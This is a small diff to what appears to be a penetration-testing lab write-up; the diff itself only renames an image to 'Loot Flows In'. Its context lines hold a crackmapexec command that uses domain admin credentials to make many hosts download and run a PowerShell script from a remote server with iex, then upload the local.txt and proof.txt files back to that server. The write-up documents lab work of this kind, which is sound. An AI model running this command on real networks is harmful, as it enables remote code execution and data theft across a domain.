@@ -184,7 +184,7 @@ We will use crackmapexec to source the upload.ps1 from our server and run it. Th
 crackmapexec smb $(cat nodes.txt) -u DomainAdminUser -p DAPassword -x 'powershell.exe -command "iex (iwr http://192.168.45.242:8443/tools/upload.ps1 -usebasicparsing);exfil -dir c:\users\ -recurse -include '*local.txt,*proof.txt' -url http://192.168.45.242:8443 "'
 ```
 <b>LOOT!!!</b>
-![](assets/images/PostServer.png?raw=true)
+![Loot Flows In](res/PostServer.png?raw=true)
 
 
 
